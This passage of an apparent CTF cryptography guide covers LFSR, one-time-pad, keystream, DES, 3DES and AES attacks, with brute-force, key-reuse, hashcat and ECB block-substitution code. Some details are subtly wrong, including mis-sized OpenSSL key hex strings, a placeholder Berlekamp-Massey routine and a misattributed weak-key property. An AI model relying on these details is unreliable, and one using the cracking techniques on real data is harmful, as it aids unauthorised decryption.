    Find minimal LFSR polynomial from output sequence
    Returns: polynomial as a list of tap positions
    [Unverified] - Implementation simplified for educational purposes
    """
    n = len(sequence)
    # This is a complex algorithm; simplified placeholder
    
    print(f"[Berlekamp-Massey: Analyzing {n} bits...]")
    print("[Full implementation requires matrix operations over GF(2)]")
    
    # For CTF: use online tools or specialized libraries
    return None
```

**Known-Plaintext Recovery:**

If you have known plaintext and ciphertext, and LFSR is used as a stream cipher:

```python
def recover_lfsr_keystream(plaintext, ciphertext, lfsr_length):
    """
    Recover LFSR output (keystream) from known plaintext
    """
    keystream = bytes(p ^ c for p, c in zip(plaintext, ciphertext))
    print(f"Recovered keystream: {keystream.hex()}")
    
    # Convert to binary for analysis
    bit_string = ''.join(format(byte, '08b') for byte in keystream)
    print(f"Bit sequence ({len(bit_string)} bits): {bit_string[:100]}...")
    
    return keystream, bit_string
```

**Brute-Force LFSR State:**

If LFSR length is small (< 32 bits), brute-force all possible initial states:

```python
def brute_force_lfsr(known_output, lfsr_length, polynomial):
    """
    Brute-force LFSR initial state
    known_output: sequence of output bits
    lfsr_length: number of bits in register
    polynomial: feedback tap configuration
    """
    for initial_state in range(1, 2 ** lfsr_length):  # Exclude all-zero state
        state = initial_state
        output_sequence = []
        
        for _ in range(len(known_output)):
            output_bit = state & 1
            output_sequence.append(output_bit)
            state = lfsr_galois(state, polynomial)
        
        # Check if output matches
        if output_sequence == known_output:
            print(f"Initial state found: {bin(initial_state)}")
            return initial_state
    
    print("Initial state not found")
    return None

# Example
known_bits = [1, 0, 1, 1, 0, 1, 0, 1]
brute_force_lfsr(known_bits, lfsr_length=8, polynomial=0xB8)
```

#### LFSR in Stream Ciphers

**Combining Multiple LFSRs:**

Modern stream ciphers use multiple LFSRs combined via non-linear functions to resist attacks:

```python
def combined_lfsr_output(lfsr_states, polynomials, combining_function):
    """
    Generate output by combining multiple LFSRs
    lfsr_states: list of initial states for each LFSR
    polynomials: list of feedback polynomials
    combining_function: function to XOR outputs (or other combining operation)
    """
    output_bits = []
    
    for _ in range(64):  # Generate 64 output bits
        outputs = []
        for i, state in enumerate(lfsr_states):
            outputs.append(state & 1)
            lfsr_states[i] = lfsr_galois(state, polynomials[i])
        
        combined = combining_function(outputs)
        output_bits.append(combined)
    
    return output_bits

# Combining function: XOR all outputs
def xor_combine(bits):
    result = 0
    for bit in bits:
        result ^= bit
    return result

states = [0x01, 0x02, 0x04]
polys = [0xB8, 0xB4, 0xB2]
output = combined_lfsr_output(states, polys, xor_combine)
print(f"Combined output: {''.join(map(str, output))}")
```

#### CTF LFSR Scenarios

**Scenario 1: Recover LFSR State from Known Plaintext**

```bash
python3 << 'EOF'
# Challenge: Decrypt ciphertext knowing plaintext prefix

plaintext_known = b"flag{"
ciphertext_provided = b"\x0f\x1a\x0c\x0e\x02"

keystream = bytes(p ^ c for p, c in zip(plaintext_known, ciphertext_provided))
print(f"Keystream: {keystream.hex()}")

# If LFSR is 8-bit with known polynomial
lfsr_poly = 0xB8
bit_sequence = ''.join(format(byte, '08b') for byte in keystream)
print(f"Bit sequence: {bit_sequence}")

# Brute-force to find initial state
for initial in range(1, 256):
    state = initial
    generated = []
    for _ in range(len(bit_sequence)):
        generated.append(state & 1)
        state = lfsr_galois(state, lfsr_poly)
    
    if generated == [int(b) for b in bit_sequence]:
        print(f"Initial state: {initial} (0x{initial:02x})")
        # Use this state to decrypt full ciphertext
        break
EOF
```

**Scenario 2: Analyze Multiple LFSR-Encrypted Messages**

```bash
# If multiple messages encrypted with same LFSR but different initial states
# or if nonce + LFSR is used, analyze for patterns

python3 << 'EOF'
import os

def analyze_lfsr_messages(ciphertexts, known_plaintexts):
    """Analyze patterns in LFSR-encrypted messages"""
    keystreams = []
    
    for ctext, ptext in zip(ciphertexts, known_plaintexts):
        keystream = bytes(p ^ c for p, c in zip(ptext, ctext))
        keystreams.append(keystream)
        print(f"Keystream: {keystream.hex()}")
    
    # Look for state evolution patterns
    for i, ks in enumerate(keystreams):
        print(f"Message {i}: {bin(ks[0])} -> {bin(ks[1])}")

# Placeholder for CTF
ciphertexts = [b"cipher1", b"cipher2"]
plaintexts = [b"known1", b"known2"]
analyze_lfsr_messages(ciphertexts, plaintexts)
EOF
```

#### Tools for LFSR Analysis

**`sage` (symbolic algebra system):**

```bash
sage << 'EOF'
# Berlekamp-Massey in Sage
from sage.crypto.lfsr import LFSR

# Generate LFSR sequence
lfsr = LFSR(key=[1, 0, 1, 0, 1], taps=[4, 2])
sequence = [lfsr.next() for _ in range(100)]
print(sequence[:20])

# Find minimal polynomial (Berlekamp-Massey)
# [Unverified] - Exact Sage function may vary by version
EOF
```

**Python specialized library:**

```bash
pip install pylfsr

python3 << 'EOF'
from pylfsr import LFSR

# Create 8-bit LFSR
lfsr = LFSR(initState=[1, 0, 1, 1, 0, 1, 0, 1], feedbackTaps=[7, 5, 4, 2])
output = []
for _ in range(64):
    output.append(lfsr.output[-1])
    lfsr.next()

print(f"Output: {''.join(map(str, output))}")
EOF
```

---

### One-Time Pad (OTP)

The One-Time Pad is a theoretically unbreakable cipher using a truly random key as long as the plaintext, with each key bit used only once. Its security is information-theoretic—perfect secrecy is proven under ideal conditions.

#### OTP Mechanics

**Encryption:**

```
Ciphertext = Plaintext XOR KeyPad
C = P ⊕ K
```

**Decryption:**

```
Plaintext = Ciphertext XOR KeyPad
P = C ⊕ K
```

Since XOR is self-inverse, encryption and decryption are identical.

**Python Implementation:**

```python
import os

def otp_encrypt(plaintext, key):
    """
    OTP encryption
    key must be: length >= len(plaintext), truly random, never reused
    """
    if len(key) < len(plaintext):
        raise ValueError("Key must be at least as long as plaintext")
    
    ciphertext = bytes(p ^ k for p, k in zip(plaintext, key))
    return ciphertext

def otp_decrypt(ciphertext, key):
    """OTP decryption (identical to encryption)"""
    return otp_encrypt(ciphertext, key)

# Example (insecure for demonstration only)
plaintext = b"Secret message"
key = os.urandom(len(plaintext))  # Must be truly random

ciphertext = otp_encrypt(plaintext, key)
print(f"Ciphertext: {ciphertext.hex()}")

decrypted = otp_decrypt(ciphertext, key)
print(f"Decrypted: {decrypted}")
```

#### OTP Weaknesses in Practice

**Key Reuse Attack:**

If the same OTP key is used for multiple messages, the cipher is broken:

```python
def otp_reuse_attack(ciphertext1, ciphertext2, known_plaintext1=None):
    """
    Break OTP if same key is used for two messages
    c1 = p1 ⊕ k
    c2 = p2 ⊕ k
    c1 ⊕ c2 = p1 ⊕ p2 (key cancels)
    """
    xored = bytes(c1 ^ c2 for c1, c2 in zip(ciphertext1, ciphertext2))
    print(f"c1 ⊕ c2 = {xored.hex()}")
    print(f"This equals p1 ⊕ p2 (plaintext XOR plaintext)")
    
    # If known_plaintext1 is available
    if known_plaintext1:
        # Recover plaintext2
        plaintext2 = bytes(p ^ x for p, x in zip(known_plaintext1, xored))
        print(f"Recovered plaintext2: {plaintext2}")
        return plaintext2
    
    return xored

# CTF Example: Two messages encrypted with same OTP key
c1 = b"\x0f\x1a\x0c\x0e\x02\x1f\x11"  # message1 ⊕ key
c2 = b"\x1d\x08\x1e\x1c\x10\x0b\x07"  # message2 ⊕ key

xored_result = otp_reuse_attack(c1, c2)

# If message1 is known ("flag{...}")
known_m1 = b"flag{"
recovered_m2 = otp_reuse_attack(c1, c2, known_m1)
```

**Partial Key Recovery from Multiple Messages:**

If three or more messages are encrypted with OTP key reuse, plaintext can be progressively recovered:

```python
def otp_multi_reuse_attack(ciphertexts, min_length=5):
    """
    [Inference] - If multiple ciphertexts encrypted with same key,
    derive constraints on plaintext through XOR relationships
    """
    print("[Analyzing OTP key reuse with multiple ciphertexts...]")
    
    # c1 ⊕ c2 = m1 ⊕ m2
    # c1 ⊕ c3 = m1 ⊕ m3
    # c2 ⊕ c3 = m2 ⊕ m3
    # All pairwise XORs give plaintext-only information
    
    print("Computing all pairwise XORs...")
    for i in range(len(ciphertexts)):
        for j in range(i + 1, len(ciphertexts)):
            xored = bytes(c1 ^ c2 for c1, c2 in zip(ciphertexts[i], ciphertexts[j]))
            print(f"c{i} ⊕ c{j}: {xored.hex()}")
    
    # Use frequency analysis on XORed results
    # English text XOR English text has specific frequency patterns
    print("[Apply frequency analysis to recover plaintexts]")

# Example
ciphertexts = [
    b"\x0f\x1a\x0c\x0e\x02",
    b"\x1d\x08\x1e\x1c\x10",
    b"\x0a\x15\x09\x0d\x07"
]
otp_multi_reuse_attack(ciphertexts)
```

**Weak Random Number Generator:**

If the OTP key is generated by a weak PRNG instead of true randomness:

```python
def weak_otp_attack(ciphertext, prng_seed_length=32):
    """
    Brute-force OTP key if generated by weak PRNG
    [Inference] - Effectiveness depends on PRNG quality
    """
    import random
    
    known_plaintext = b"flag"
    
    # Brute-force PRNG seeds
    for seed in range(2 ** min(16, prng_seed_length)):  # Limit to 2^16 for speed
        random.seed(seed)
        key = bytes(random.randint(0, 255) for _ in range(len(ciphertext)))
        
        decrypted = bytes(c ^ k for c, k in zip(ciphertext, key))
        if decrypted.startswith(known_plaintext):
            print(f"Seed found: {seed}")
            print(f"Key: {key.hex()}")
            print(f"Plaintext: {decrypted}")
            return key
    
    print("Seed not found in range")
    return None

# Hypothetical weak OTP
weak_cipher = b"\x0f\x1a\x0c\x0e\x02"
weak_otp_attack(weak_cipher)
```

**Known-Plaintext Attack:**

If any plaintext-ciphertext pair is known, the entire OTP key is recovered:

```python
def otp_known_plaintext(plaintext, ciphertext):
    """
    Recover OTP key from known plaintext
    k = p ⊕ c
    """
    if len(plaintext) != len(ciphertext):
        raise ValueError("Plaintext and ciphertext must be same length")
    
    key = bytes(p ^ c for p, c in zip(plaintext, ciphertext))
    print(f"Recovered key: {key.hex()}")
    return key

# CTF: If plaintext prefix is "flag{"
ciphertext = b"\x0f\x1a\x0c\x0e\x02"
plaintext = b"flag{"
key = otp_known_plaintext(plaintext, ciphertext)

# Use key to decrypt longer ciphertext
full_ciphertext = open("ciphertext.bin", "rb").read()
decrypted = bytes(c ^ key[i % len(key)] for i, c in enumerate(full_ciphertext))
print(f"Full decryption: {decrypted}")
```

#### OTP in CTF Contexts

OTP challenges typically involve:

- **Key reuse vulnerabilities**: Multiple messages encrypted with same OTP.
- **Weak key generation**: PRNG-based OTP instead of true randomness.
- **Known-plaintext scenarios**: Partial plaintext recovery to deduce key.
- **Theoretical analysis**: Proving information-theoretic security (academic CTFs).

**Common CTF Pattern:**

```bash
# Challenge: Two messages encrypted with same OTP key; recover both plaintexts

python3 << 'EOF'
# Given: c1, c2 (encrypted with same key k)
# c1 = m1 ⊕ k
# c2 = m2 ⊕ k

c1 = bytes.fromhex("0f1a0c0e02")  # m1 ⊕ k
c2 = bytes.fromhex("1d081e1c10")  # m2 ⊕ k

xored = bytes(a ^ b for a, b in zip(c1, c2))
print(f"c1 ⊕ c2 = m1 ⊕ m2: {xored}")

# If m1 is known ("flag")
m1 = b"flag"
m2 = bytes(x ^ y for x, y in zip(xored, m1))
print(f"m2 (recovered): {m2}")

# Or, recover key if plaintext is known
k = bytes(c ^ m for c, m in zip(c1, m1))
print(f"Key (recovered): {k.hex()}")

# Decrypt m1 fully
m1_full = bytes(k[i % len(k)] ^ c for i, c in enumerate(c1))
print(f"m1 (full): {m1_full}")
EOF
```

---

### Keystream Generation

Keystream generation is the process of producing a sequence of pseudo-random bits or bytes used to encrypt plaintext in stream ciphers. Secure keystream generation is critical for stream cipher security.

#### Keystream Properties

Secure keystreams must satisfy:

1. **Unpredictability**: Next bit cannot be determined from previous bits with probability > 50%.
2. **Uniform Distribution**: All bit values occur with equal frequency.
3. **Avalanche Effect**: Tiny key/state changes produce drastically different keystreams.
4. **Long Period**: Keystream should not repeat within practical use duration.

#### Common Keystream Generation Techniques

**Counter Mode (CTR):**

Uses a counter incremented for each block, encrypted to produce keystream:

```python
def ctr_mode_keystream(key, nonce, block_cipher_func, block_size=16, length=1024):
    """
    Generate keystream using counter mode
    block_cipher_func: encryption function (e.g., AES)
    """
    keystream = b""
    counter = 0
    
    while len(keystream) < length:
        # Combine nonce and counter
        plaintext_block = nonce + counter.to_bytes(block_size - len(nonce), 'big')
        
        # Encrypt counter block
        ciphertext_block = block_cipher_func(key, plaintext_block)
        keystream += ciphertext_block
        
        counter += 1
    
    return keystream[:length]

# Placeholder (actual AES requires cryptography library)
def dummy_aes(key, block):
    """Dummy encryption for illustration"""
    import hashlib
    return hashlib.sha256(key + block).digest()[:16]

ks = ctr_mode_keystream(b"key", b"nonce", dummy_aes, length=64)
print(f"Keystream: {ks.hex()}")
```

**Nonce-Based Generation:**

Modern ciphers generate keystream from a key and nonce, allowing different keystreams from same key (essential for multi-message encryption):

```python
def nonce_based_keystream(key, nonce, keystream_func, length):
    """
    Generate keystream from key and nonce
    keystream_func: function(key, nonce) -> keystream generator
    """
    # Example: ChaCha20 or similar
    keystream = keystream_func(key, nonce, length)
    return keystream

# Ensure different nonces → different keystreams
key = b"shared_key_32_bytes_long_here"
nonce1 = b"nonce1_12bytes"
nonce2 = b"nonce2_12bytes"

# [Inference] - Different nonces must produce different keystreams
print("Requirement: nonce1 ≠ nonce2 ⇒ keystream1 ≠ keystream2")
```

**Hash-Based Keystream:**

Some constructions derive keystream from repeated hash operations:

```python
def hash_based_keystream(key, length, hash_func=None):
    """
    Generate keystream by hashing key iteratively
    [Inference] - Security depends on hash function strength
    """
    import hashlib
    
    if hash_func is None:
        hash_func = hashlib.sha256
    
    keystream = b""
    state = key
    
    while len(keystream) < length:
        state = hash_func(state).digest()
        keystream += state
    
    return keystream[:length]

ks = hash_based_keystream(b"secret", length=128)
print(f"Hash-based keystream: {ks.hex()}")
```

#### Keystream Analysis in CTF

**Periodicity Detection:**

```python
def detect_keystream_period(keystream, max_period=1000):
    """
    Detect if keystream repeats (breaks the cipher)
    """
    for period in range(1, min(max_period, len(keystream) // 2)):
        repeats = True
        for i in range(len(keystream) - period):
            if keystream[i] != keystream[i + period]:
                repeats = False
                break
        
        if repeats:
            print(f"Period found: {period}")
            return period
    
    print("No period found in tested range")
    return None

# Test keystream
ks = b"ABC" * 100  # Repeating pattern
period = detect_keystream_period(ks)
```

**Frequency Analysis:**

```python
def analyze_keystream_quality(keystream):
    """
    Analyze keystream for deviations from randomness
    """
    from collections import Counter
    
    # Byte-level frequencies
    freq = Counter(keystream)
    expected = len(keystream) / 256
    
    print("Byte frequency deviations:")
    max_deviation = 0
    for byte, count in freq.most_common(10):
        deviation = abs(count - expected) / expected * 100
        max_deviation = max(max_deviation, deviation)
        print(f"  Byte {byte:3d}: {count:4d} ({deviation:5.2f}% deviation)")
    
    print(f"Maximum deviation: {max_deviation:.2f}%")
    
    # Bit-level frequencies (should be ~50% 0s and 1s)
    bits = ''.join(format(byte, '08b') for byte in keystream)
    zero_freq = bits.count('0') / len(bits) * 100
    print(f"Bit 0 frequency: {zero_freq:.2f}%")

# Test
ks = bytes(range(256)) * 4
analyze_keystream_quality(ks)
```

**Correlation with Known Sequences:**

```python
def correlate_keystream(keystream, known_sequence):
    """
    Check if keystream correlates with known sequence
    [Inference] - High correlation indicates bias or weak generation
    """
    correlation = sum(k == s for k, s in zip(keystream, known_sequence)) / len(keystream)
    print(f"Correlation with known sequence: {correlation:.4f}")
    
    if correlation > 0.6:
        print("[Warning: Significant correlation detected—cipher may be biased]")
    
    return correlation

# Example
ks = bytes([0xFF] * 100 + [0x00] * 100)  # Biased keystream
known = bytes([0xFF] * 256)
correlate_keystream(ks, known)
```

#### Keystream Attacks in CTF

**Keystream Recovery from Multiple Encryptions:**

```python
def recover_keystream_multi_ciphertext(plaintexts, ciphertexts):
    """
    If same keystream used for multiple messages, recover it
    k = c ⊕ p (for any plaintext-ciphertext pair)
    """
    keystreams = []
    
    for p, c in zip(plaintexts, ciphertexts):
        ks = bytes(x ^ y for x, y in zip(p, c))
        keystreams.append(ks)
        print(f"Recovered keystream segment: {ks.hex()}")
    
    # Verify consistency
    if all(ks == keystreams[0] for ks in keystreams):
        print("[Consistent keystream across messages—vulnerability confirmed]")
        return keystreams[0]
    else:
        print("[Keystream differs—different keys or nonces used]")
        return None

# CTF scenario
plaintexts = [b"message1_part", b"message2_part"]
ciphertexts = [b"\x0f\x1a\x0c\x0e\x02\x1f\x11\x0d\x0c\x1b\x08\x1a\x0f", 
                b"\x0f\x1a\x0c\x0e\x02\x1f\x11\x0d\x0c\x1b\x08\x1a\x0f"]

recover_keystream_multi_ciphertext(plaintexts, ciphertexts)
```

**Predictable Keystream from Weak PRNG:**

```python
def exploit_weak_keystream_prng(ciphertext, known_plaintext, prng_type='mt19937'):
    """
    If keystream generated from weak PRNG, predict next bytes
    [Inference] - Requires identified PRNG and sufficient output
    """
    import random
    
    # Recover PRNG state from known plaintext
    ks_sample = bytes(p ^ c for p, c in zip(known_plaintext, ciphertext[:len(known_plaintext)]))
    
    print(f"Keystream sample: {ks_sample.hex()}")
    
    # Try to identify PRNG (Mersenne Twister, etc.)
    if prng_type == 'mt19937':
        print("[Attempting to recover Mersenne Twister state...]")
        # Requires specialized tools (e.g., mt19937-predictor)
        # [Unverified] - State recovery from output is complex
    
    print("[Use mt19937-predictor or similar for full implementation]")

# Placeholder
ctext = b"\x0f\x1a\x0c\x0e\x02"
ptext = b"flag{"
exploit_weak_keystream_prng(ctext, ptext)
```

#### Tools for Keystream Analysis

**`xortool` (automated keystream recovery):**

```bash
# Recover keystream from multiple ciphertexts
xortool-xor -f ciphertext1.bin ciphertext2.bin

# Display discovered keys/keystreams
xortool-xor -c 20 ciphertext1.bin ciphertext2.bin | grep -i flag
```

**Python `Crypto` library:**

```bash
pip install pycryptodome

python3 << 'EOF'
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

key = os.urandom(16)
nonce = 0
ctr = Counter.new(128, initial_value=nonce)

cipher = AES.new(key, AES.MODE_CTR, counter=ctr)
keystream = cipher.encrypt(b"\x00" * 256)
print(f"CTR-mode keystream: {keystream.hex()}")
EOF
```

**`sage` for mathematical analysis:**

```bash
sage << 'EOF'
# Analyze LFSR-based keystream generation
# [Unverified] - Requires specialized LFSR and cryptography modules
import random

def prng_predict(output_bytes, num_predictions=10):
    """[Inference] - Predict PRNG output"""
    print("[PRNG prediction requires state recovery]")
    print("[Use mt19937-predictor or cryptanalysis tools]")

prng_predict(b"output")
EOF
```

#### CTF Keystream Exploitation Strategy

1. **Identify keystream generation method** from challenge description or reverse engineering.
2. **Test for key reuse**: Encrypt multiple messages; if keystreams are identical, cipher is broken.
3. **Detect weak randomness**: Check keystream for patterns, biases, or periodicity.
4. **Exploit known-plaintext**: Recover keystream directly via XOR if plaintext is known.
5. **Brute-force weak PRNG**: If keystream generated by weak RNG, recover state and predict.
6. **Apply frequency analysis**: Identify deviations from randomness; exploit biases.
7. **Use automated tools** (`xortool`, specialized solvers) when available.

---

## Block Ciphers

Block ciphers encrypt fixed-size plaintext blocks (typically 64 or 128 bits) into ciphertext blocks using cryptographic keys. Unlike stream ciphers that process data byte-by-byte, block ciphers apply complex mathematical operations across entire blocks through iterative rounds. CTF challenges frequently feature block cipher vulnerabilities including ECB mode weaknesses, padding oracle attacks, key recovery, and implementation flaws.

### DES (Data Encryption Standard)

DES encrypts 64-bit blocks using 56-bit keys through 16 rounds of substitution and permutation operations. Despite historical importance, DES is cryptographically broken due to small key size and is now considered unsuitable for protecting sensitive data.

#### Encryption Process

DES performs initial permutation (IP), 16 Feistel rounds, and final permutation (IP⁻¹). Each round uses a round key derived from the 56-bit master key through key schedule operations. The Feistel structure applies a function F to half the block, XORs with the other half, then swaps halves.

Key schedule expands the 56-bit key into 16 round keys of 48 bits each through permutation and rotation operations. The same algorithm decrypts by applying round keys in reverse order.

#### CTF Vulnerabilities

**ECB Mode Oracle:** [Inference] DES in ECB mode produces identical ciphertext for identical plaintext blocks, enabling block substitution attacks. Identical ciphertext blocks reveal plaintext patterns.

**Brute Force:** 56-bit key space (2⁵⁶) was broken in 1997 by Deep Crack and remains feasible with modern hardware. Dictionary-based attacks succeed if key material derives from passwords.

**Weak Keys:** Four keys produce identical encryption/decryption (complementary key property). Known weak keys should be tested first: `0x0101010101010101`, `0xFEFEFEFEFEFEFEFE`, `0xE0E0E0E0F1F1F1F1`, `0x1F1F1F1F0E0E0E0E`.

#### CTF Tools and Commands

**Python DES Encryption (PyCryptodome):**

```python
from Crypto.Cipher import DES
from Crypto.Random import get_random_bytes
import binascii

key = b'12345678'  # 8 bytes = 64 bits (56 usable)
plaintext = b'Hello123'  # 8 bytes = 64 bits

cipher = DES.new(key, DES.MODE_ECB)
ciphertext = cipher.encrypt(plaintext)
print(binascii.hexlify(ciphertext))

decipher = DES.new(key, DES.MODE_ECB)
decrypted = decipher.decrypt(ciphertext)
print(decrypted)
```

**OpenSSL DES Encryption:**

```bash
# ECB mode encryption (vulnerable to pattern analysis)
echo -n "Hello123" | openssl enc -des-ecb -K 3132333435363738 -nopad | xxd

# CBC mode encryption (requires IV)
echo -n "Hello123" | openssl enc -des-cbc -K 3132333435363738 -iv 0102030405060708 -nopad | xxd

# Decrypt
echo -n "encrypted_hex" | xxd -r -p | openssl enc -d -des-ecb -K 3132333435363738 -nopad
```

**Brute Force DES Key (hashcat):**

```bash
# Create DES hash file format
echo "ciphertext_hex:plaintext_hex" > des_hash.txt

# Brute force with mask (8 character ASCII keys)
hashcat -m 14000 -a 3 des_hash.txt ?a?a?a?a?a?a?a?a

# Dictionary attack on DES ECB ciphertext
hashcat -m 14000 -a 0 des_hash.txt /usr/share/wordlists/rockyou.txt
```

**Python DES Brute Force (Weak Keys):**

```python
from Crypto.Cipher import DES
import binascii

weak_keys = [
    b'\x01\x01\x01\x01\x01\x01\x01\x01',
    b'\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE',
    b'\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1',
    b'\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E'
]

ciphertext = binascii.unhexlify("8d6e3e4c5f2a1b9c")

for key in weak_keys:
    try:
        cipher = DES.new(key, DES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext)
        print(f"Weak Key Found: {binascii.hexlify(key)} -> {plaintext}")
    except:
        pass
```

**Known Plaintext Attack (Key Recovery):**

```python
# If you know plaintext-ciphertext pair, extract key bits
# DES key recovery requires 2^56 operations in worst case
# With known plaintext, differential cryptanalysis reduces complexity

def des_key_brute_force(known_plaintext, known_ciphertext, wordlist):
    from Crypto.Cipher import DES
    for word in wordlist:
        key = (word * 8)[:8].encode()  # Pad to 8 bytes
        try:
            cipher = DES.new(key, DES.MODE_ECB)
            if cipher.encrypt(known_plaintext) == known_ciphertext:
                return key
        except:
            pass
    return None
```

**Kali Linux: hashcat with GPU acceleration:**

```bash
# Install hashcat on Kali
sudo apt update && sudo apt install hashcat

# Brute force DES (slow without GPU)
hashcat -m 14000 des_hash.txt -a 3 -1 ?a ?1?1?1?1?1?1?1?1 --increment --increment-min 4
```

#### ECB Mode Vulnerability Exploitation

ECB (Electronic Codebook) mode encrypts identical plaintext blocks to identical ciphertext blocks. This enables:

**Block Substitution Attack:**

```python
# If attacker controls plaintext partially and observes ciphertext
# Attacker can substitute blocks to modify encrypted message

# Example: Swap user ID blocks to escalate privilege
plaintext = b"user_id=3333333|admin=0"  # Must be multiple of 8 bytes
ciphertext = encrypt_ecb(plaintext)

# Extract ciphertext block containing "admin=0"
admin_block = ciphertext[-8:]

# Create new plaintext where attacker controls a block
attacker_plaintext = b"user_id=1111111|admin=0"
attacker_ciphertext = encrypt_ecb(attacker_plaintext)

# Replace admin block
modified_ciphertext = attacker_ciphertext[:-8] + admin_block
# This may decrypt to valid admin payload
```

**Visual ECB Pattern Exposure:**

ECB encrypts image data revealing plaintext patterns. Encrypt image in ECB mode and identical pixel blocks produce identical ciphertext blocks, showing image structure in ciphertext.

---

### 3DES (Triple DES)

3DES applies DES encryption three times (encrypt-decrypt-encrypt with 2 or 3 keys) to overcome single DES's weak key size. Standard 3DES uses 168-bit effective key size (3 × 56 bits), though key reuse reduces this.

#### Encryption Process

**3DES-EEE:** Encrypt with K1, encrypt with K2, encrypt with K3. Used rarely.

**3DES-EDE (Standard):** Encrypt with K1, decrypt with K2, encrypt with K3. This structure provides backward compatibility with single DES (when K1=K2=K3).

**2-Key 3DES:** Encrypt with K1, decrypt with K2, encrypt with K1. Reduces key material to 112 bits effective.

```
C = E_K3(D_K2(E_K1(P)))
```

#### CTF Vulnerabilities

**Meet-in-the-Middle Attack:** [Unverified] With known plaintext-ciphertext pairs, meet-in-the-middle reduces 3DES complexity from 2¹¹² to approximately 2⁵⁶, though practical implementation remains complex. This attack builds two tables: one for all possible (plaintext → intermediate value) pairs, another for (ciphertext → intermediate value) pairs, then matches.

**Two-Key 3DES Weakness:** If implementation uses 2-key variant, only 112-bit effective key remains, making brute force more feasible.

**ECB Mode Vulnerabilities:** Same ECB weaknesses apply to 3DES.

#### CTF Tools and Commands

**Python 3DES Encryption (PyCryptodome):**

```python
from Crypto.Cipher import DES3
import binascii

# 3-key variant (24 bytes)
key_24 = b'12345678abcdefgh12345678'

# 2-key variant (16 bytes)
key_16 = b'12345678abcdefgh'

plaintext = b'Hello123'  # 8 bytes

# 3DES-EDE mode
cipher = DES3.new(key_24, DES3.MODE_ECB)
ciphertext = cipher.encrypt(plaintext)
print(f"3DES Ciphertext: {binascii.hexlify(ciphertext)}")

# Decrypt
decipher = DES3.new(key_24, DES3.MODE_ECB)
decrypted = decipher.decrypt(ciphertext)
print(f"Decrypted: {decrypted}")
```

**OpenSSL 3DES Operations:**

```bash
# 3DES-EDE3-ECB encryption (24-byte key)
echo -n "Hello123" | openssl enc -des-ede3-ecb -K 3132333435363738616263646566676831323334353637383132333435363738 -nopad | xxd

# 3DES-EDE3-CBC (with IV)
echo -n "Hello123" | openssl enc -des-ede3-cbc -K 3132333435363738616263646566676831323334353637383132333435363738 -iv 0102030405060708 -nopad | xxd

# Decrypt
openssl enc -d -des-ede3-cbc -K [key_hex] -iv [iv_hex] -in ciphertext_file
```

**3DES Key Brute Force (Dictionary Attack):**

```python
from Crypto.Cipher import DES3
import binascii

def bruteforce_3des(ciphertext_hex, known_plaintext_hex, wordlist_file):
    ciphertext = binascii.unhexlify(ciphertext_hex)
    plaintext = binascii.unhexlify(known_plaintext_hex)
    
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip()
            # Expand word to 24 bytes (3DES key size)
            key = (word * 3)[:24].encode() if isinstance(word, str) else (word * 3)[:24]
            try:
                cipher = DES3.new(key, DES3.MODE_ECB)
                if cipher.encrypt(plaintext) == ciphertext:
                    print(f"Key Found: {word}")
                    return key
            except:
                pass
    return None

# Usage
bruteforce_3des("8d6e3e4c5f2a1b9c", "48656c6c6f313233", "/usr/share/wordlists/rockyou.txt")
```

**Kali Linux: hashcat 3DES cracking:**

```bash
# 3DES hash format (requires specific mode number)
hashcat -m 14100 -a 0 3des_hash.txt /usr/share/wordlists/rockyou.txt

# Or dictionary + rules
hashcat -m 14100 -a 0 3des_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

### AES (Advanced Encryption Standard)

AES encrypts 128-bit blocks using 128, 192, or 256-bit keys through 10, 12, or 14 rounds respectively. AES is NIST-certified and cryptographically strong, with most CTF vulnerabilities arising from implementation flaws rather than fundamental weakness.

#### Encryption Process

AES performs four operations per round: SubBytes (substitution using S-boxes), ShiftRows (row-wise byte shifting), MixColumns (matrix multiplication over GF(2⁸)), and AddRoundKey (XOR with round key). Final round omits MixColumns.

Key expansion generates round keys from master key through substitution and rotation operations.

#### CTF Vulnerabilities

**ECB Mode Weaknesses:** Same ECB pattern analysis applies to AES.

**Padding Oracle Attack:** [Unverified] If decryption returns different responses for valid vs. invalid padding, attacker can decrypt ciphertext byte-by-byte. Each ciphertext block is tested with varying last byte values; valid padding returns success response, enabling plaintext recovery.

**Side-Channel Attacks:** [Unverified] Timing analysis, power analysis, and cache timing may reveal key bits if implementation lacks constant-time operations.

**Weak Initialization Vectors (IV):** CBC and CTR modes require cryptographically random IVs. Reused IVs enable XOR-based plaintext recovery.

**Known Plaintext Attack:** With sufficient known plaintext-ciphertext pairs, differential cryptanalysis or algebraic attacks may reduce key space (for reduced-round AES only; full AES remains secure).

#### CTF Tools and Commands

**Python AES Encryption (PyCryptodome):**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import binascii
import os

# AES-128 (16-byte key)
key_128 = b'1234567890123456'

# AES-256 (32-byte key)
key_256 = b'12345678901234567890123456789012'

plaintext = b'Hello World!!!!!'  # 16 bytes (1 block)

# ECB Mode (deterministic, vulnerable)
cipher_ecb = AES.new(key_128, AES.MODE_ECB)
ciphertext_ecb = cipher_ecb.encrypt(plaintext)
print(f"ECB Ciphertext: {binascii.hexlify(ciphertext_ecb)}")

# CBC Mode (requires IV)
iv = os.urandom(16)
cipher_cbc = AES.new(key_128, AES.MODE_CBC, iv)
ciphertext_cbc = cipher_cbc.encrypt(pad(plaintext, AES.block_size))
print(f"CBC IV + Ciphertext: {binascii.hexlify(iv + ciphertext_cbc)}")

# Decrypt CBC
decipher_cbc = AES.new(key_128, AES.MODE_CBC, iv)
decrypted = unpad(decipher_cbc.decrypt(ciphertext_cbc), AES.block_size)
print(f"Decrypted: {decrypted}")

# GCM Mode (authenticated encryption)
cipher_gcm = AES.new(key_128, AES.MODE_GCM)
ciphertext_gcm, tag = cipher_gcm.encrypt_and_digest(plaintext)
print(f"GCM Ciphertext: {binascii.hexlify(ciphertext_gcm)}, Tag: {binascii.hexlify(tag)}")
```

**OpenSSL AES Operations:**

```bash
# AES-128-ECB encryption
echo -n "Hello World!!!!!" | openssl enc -aes-128-ecb -K 3132333435363738393031323334353637 -nopad | xxd

# AES-256-CBC encryption with IV
